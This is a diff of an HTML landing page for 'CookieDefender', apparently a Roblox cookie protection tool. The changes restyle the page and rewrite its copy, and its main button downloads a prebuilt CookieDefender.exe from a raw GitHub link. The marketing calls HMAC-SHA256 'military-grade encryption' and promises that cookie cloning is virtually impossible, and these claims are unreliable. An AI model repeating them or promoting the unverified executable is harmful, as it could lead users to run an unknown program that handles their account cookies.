@@ -3,10 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CookieDefender – Roblox Cookie Protection Tool</title>
+    <title>CookieDefender - Roblox Cookie Security Tool</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
-
+        /* === GLOBAL RESET & BASE STYLES === */
         * {
             margin: 0;
             padding: 0;
@@ -14,187 +16,305 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            min-height: 100vh;
+            font-family: 'Poppins', sans-serif;
             background: #0a0a0a;
-            color: #d4d4d4;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+            color: #e0e0e0;
+            overflow-x: hidden;
+            position: relative;
         }
 
-        .card {
-            max-width: 780px;
-            width: 100%;
-            background: #111111;
-            border-radius: 28px;
-            padding: 50px 40px;
-            border: 1px solid #1a6b3c;
-            box-shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.8), 0 0 60px rgba(0, 200, 80, 0.05);
+        /* === ANIMATED BACKGROUND WITH GLOWING ORBS === */
+        body::before, body::after {
+            content: '';
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(100px);
+            opacity: 0.15;
+            z-index: 0;
+            animation: float 20s infinite ease-in-out;
+        }
+
+        body::before {
+            width: 500px;
+            height: 500px;
+            background: #00ff41;
+            top: -200px;
+            left: -200px;
+            animation-delay: 0s;
+        }
+
+        body::after {
+            width: 400px;
+            height: 400px;
+            background: #00ff41;
+            bottom: -150px;
+            right: -150px;
+            animation-delay: 10s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(100px, 100px) scale(1.2); }
+        }
+
+        /* === MAIN CONTAINER === */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 60px 20px;
+        }
+
+        /* === HERO SECTION === */
+        .hero {
             text-align: center;
-        }
-
-        .hero-image {
-            width: 100%;
-            max-height: 260px;
-            object-fit: contain;
-            margin-bottom: 20px;
-            border-radius: 16px;
-            border: 2px solid #1a6b3c;
-            box-shadow: 0 0 40px rgba(0, 200, 80, 0.15);
+            margin-bottom: 80px;
         }
 
         .logo {
-            font-size: 3em;
-            font-weight: 800;
-            color: #00e676;
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 30px;
+            filter: drop-shadow(0 0 30px rgba(0, 255, 65, 0.5));
+            animation: pulse 3s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        h1 {
+            font-size: 4rem;
+            font-weight: 700;
+            color: #00ff41;
+            text-shadow: 0 0 40px rgba(0, 255, 65, 0.8), 0 0 80px rgba(0, 255, 65, 0.4);
+            margin-bottom: 15px;
             letter-spacing: -1px;
-            margin-bottom: 4px;
-            text-shadow: 0 0 20px rgba(0, 230, 118, 0.3);
         }
 
         .tagline {
-            font-size: 1.1em;
-            color: #80cbc4;
-            font-weight: 400;
-            margin-bottom: 24px;
-            border-bottom: 1px solid #1a6b3c;
-            padding-bottom: 18px;
-        }
-
-        .badge {
-            display: inline-block;
-            background: rgba(0, 230, 118, 0.12);
-            color: #00e676;
-            padding: 4px 18px;
-            border-radius: 30px;
-            font-size: 0.85em;
-            font-weight: 600;
-            margin-bottom: 20px;
-            border: 1px solid #1a6b3c;
+            font-size: 1.3rem;
+            color: #7ed957;
+            font-weight: 300;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
         }
 
         .description {
-            font-size: 1.05em;
-            line-height: 1.7;
-            color: #b0bec5;
-            margin-bottom: 28px;
+            max-width: 700px;
+            margin: 0 auto 50px;
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: #b0b0b0;
         }
 
-        .features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            text-align: left;
-            margin: 30px 0;
-        }
-
-        .feature-item {
-            background: #1a1a1a;
-            padding: 14px 18px;
-            border-radius: 14px;
-            border-left: 3px solid #00e676;
-            font-size: 0.95em;
-            color: #c8e6c9;
-        }
-
-        .feature-item strong {
-            color: #69f0ae;
-        }
-
-        .download-section {
-            margin-top: 32px;
-        }
-
+        /* === DOWNLOAD BUTTON === */
         .download-btn {
             display: inline-flex;
             align-items: center;
-            gap: 12px;
-            background: linear-gradient(135deg, #00c853, #009624);
-            color: #f5f5f5;
-            font-size: 1.3em;
-            font-weight: 700;
-            padding: 18px 48px;
-            border-radius: 60px;
+            gap: 15px;
+            background: linear-gradient(135deg, #00ff41, #00cc33);
+            color: #000;
+            padding: 20px 50px;
+            font-size: 1.3rem;
+            font-weight: 600;
             text-decoration: none;
-            box-shadow: 0 8px 30px rgba(0, 200, 80, 0.4);
+            border-radius: 50px;
+            box-shadow: 0 10px 40px rgba(0, 255, 65, 0.4);
             transition: all 0.3s ease;
-            border: none;
-            cursor: pointer;
+            position: relative;
+            overflow: hidden;
         }
 
         .download-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 12px 40px rgba(0, 200, 80, 0.6);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 60px rgba(0, 255, 65, 0.6);
         }
 
         .download-btn svg {
-            width: 24px;
-            height: 24px;
-            fill: currentColor;
+            width: 28px;
+            height: 28px;
+            fill: #000;
         }
 
-        .secondary-info {
-            margin-top: 30px;
-            font-size: 0.85em;
-            color: #607d8b;
+        /* === FEATURES GRID === */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 30px;
+            margin: 80px 0;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            border-radius: 20px;
+            padding: 35px 25px;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .feature-card:hover {
+            background: rgba(0, 255, 65, 0.05);
+            border-color: rgba(0, 255, 65, 0.3);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 40px rgba(0, 255, 65, 0.2);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .feature-card h3 {
+            color: #00ff41;
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .feature-card p {
+            color: #a0a0a0;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        /* === FOOTER INFO BAR === */
+        .info-bar {
             display: flex;
             justify-content: center;
-            gap: 30px;
+            align-items: center;
+            gap: 40px;
+            margin-top: 60px;
+            padding: 25px;
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            border-radius: 15px;
             flex-wrap: wrap;
         }
 
-        .secondary-info span {
-            background: #1a1a1a;
-            padding: 6px 16px;
-            border-radius: 20px;
-            border: 1px solid #1a6b3c;
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #b0b0b0;
+            font-size: 0.95rem;
         }
 
-        @media (max-width: 600px) {
-            .card { padding: 30px 20px; }
-            .features { grid-template-columns: 1fr; }
-            .download-btn { width: 100%; justify-content: center; }
-            .hero-image { max-height: 180px; }
+        .info-item strong {
+            color: #00ff41;
+            font-weight: 600;
+        }
+
+        /* === RESPONSIVE DESIGN === */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+
+            .tagline {
+                font-size: 1rem;
+            }
+
+            .description {
+                font-size: 1rem;
+            }
+
+            .download-btn {
+                padding: 18px 40px;
+                font-size: 1.1rem;
+            }
+
+            .features {
+                grid-template-columns: 1fr;
+            }
+
+            .info-bar {
+                gap: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <!-- Image from repo -->
-        <img class="hero-image" src="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/cookie%20defender2.png" alt="CookieDefender Logo">
-
-        <div class="logo">CookieDefender</div>
-        <div class="tagline">Roblox Cookie Security Tool</div>
-        <div class="badge">Version 5.1.0 · Release 2025</div>
-
-        <p class="description">
-            Secure your Roblox cookie with military‑grade protection. CookieDefender applies 
-            cryptographic binding and runtime security layers to prevent session theft.
-        </p>
-
-        <div class="features">
-            <div class="feature-item"><strong>HMAC‑SHA256</strong> – Session‑specific binding</div>
-            <div class="feature-item"><strong>Anti‑Phishing</strong> – Wrapper encapsulation</div>
-            <div class="feature-item"><strong>Hardware Key</strong> – Signing integration</div>
-            <div class="feature-item"><strong>Auto‑Verify</strong> – Integrity check on run</div>
-        </div>
-
-        <div class="download-section">
-            <a class="download-btn" href="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/CookieDefender.exe" download>
-                <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
-                    <path d="M5 20h14v-2H5v2zm7-18L5.33 9h3.84v6h3.66V9h3.84L12 2z"/>
+    <div class="container">
+        <!-- HERO SECTION -->
+        <section class="hero">
+            <!-- Logo Image -->
+            <img src="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/cookie%20defender.png" alt="CookieDefender Logo" class="logo">
+            
+            <!-- Title with Glow Effect -->
+            <h1>CookieDefender</h1>
+            
+            <!-- Tagline -->
+            <p class="tagline">Roblox Cookie Security Tool</p>
+            
+            <!-- Description -->
+            <p class="description">
+                Protect your Roblox account with advanced cryptographic binding and real-time integrity monitoring. 
+                CookieDefender uses military-grade HMAC-SHA256 encryption to secure your authentication cookies 
+                against phishing attacks, credential theft, and unauthorized access. Stay safe, stay protected.
+            </p>
+            
+            <!-- Download Button -->
+            <a href="https://raw.githubusercontent.com/Quincyzx/CookieDefender/main/CookieDefender.exe" class="download-btn" download>
+                <!-- Download Icon SVG -->
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
                 </svg>
                 Download CookieDefender
             </a>
-        </div>
+        </section>
 
-        <div class="secondary-info">
-            <span>Windows 10 / 11</span>
-            <span>64‑bit</span>
-            <span>No installation</span>
-            <span>~18 MB</span>
+        <!-- FEATURES GRID -->
+        <section class="features">
+            <!-- Feature 1 -->
+            <div class="feature-card">
+                <span class="feature-icon">🔐</span>
+                <h3>HMAC-SHA256 Binding</h3>
+                <p>Advanced cryptographic hashing ensures your cookies are uniquely bound to your hardware, preventing unauthorized transfers.</p>
+            </div>
+
+            <!-- Feature 2 -->
+            <div class="feature-card">
+                <span class="feature-icon">🛡️</span>
+                <h3>Anti-Phishing Wrapper</h3>
+                <p>Intelligent request filtering blocks malicious scripts from intercepting or stealing your authentication data in real-time.</p>
+            </div>
+
+            <!-- Feature 3 -->
+            <div class="feature-card">
+                <span class="feature-icon">🔑</span>
+                <h3>Hardware Key Signing</h3>
+                <p>Generates unique machine signatures that validate session authenticity, making cookie cloning virtually impossible.</p>
+            </div>
+
+            <!-- Feature 4 -->
+            <div class="feature-card">
+                <span class="feature-icon">⚡</span>
+                <h3>Auto-Integrity Check</h3>
+                <p>Continuous background monitoring detects tampering or corruption, automatically refreshing secure tokens when needed.</p>
+            </div>
+        </section>
+
+        <!-- FOOTER INFO BAR -->
+        <div class="info-bar">
+            <div class="info-item">
+                <strong>💻</strong> Windows 10/11
+            </div>
+            <div class="info-item">
+                <strong>⚙️</strong> 64-bit
+            </div>
+            <div class="info-item">
+                <strong>📦</strong> No installation
+            </div>
+            <div class="info-item">
+                <strong>📊</strong> ~18 MB
+            </div>
         </div>
     </div>
 </body>
